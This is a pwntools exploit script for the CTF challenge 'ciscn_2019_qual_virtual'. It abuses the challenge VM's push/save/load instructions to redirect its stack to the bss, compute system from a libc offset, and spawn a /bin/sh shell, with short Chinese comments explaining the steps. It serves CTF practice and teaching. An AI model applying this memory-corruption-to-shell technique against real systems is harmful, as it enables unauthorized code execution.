# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './ciscn_2019_qual_virtual'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-2.23-buu.so')
DEBUG = 1
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28982'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

# one_gad = one_gadget(libc.path)

def attack():
    
    data_addr = 0x4040d0
    offset = libc.symbols['system'] - libc.symbols['_IO_2_1_stderr_']
    opcode = 'push push save push load push add push save'
    data = [data_addr, -3, -1, offset, -21]

    # save函数从运行栈的栈顶中取出两个值，一个值作为下标，另一个作为值
    # load函数从运行栈的栈顶中取出一个值作为下标
    
    # 第一次 save 把虚拟栈弄到 bss 段上
    # 之后load 与虚拟栈接近的 libc 地址到 stack 上

    payload = ''
    for i in data:
        payload += str(i)+' '

    sla('name:' , '/bin/sh\x00')
    sla('instruction:' , opcode)
    dbg()
    sla('stack data:' , payload)
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   ciscn_2019_qual_virtual.py
@Time    :   2022/02/08 14:12:36
@Author  :   Niyah 
'''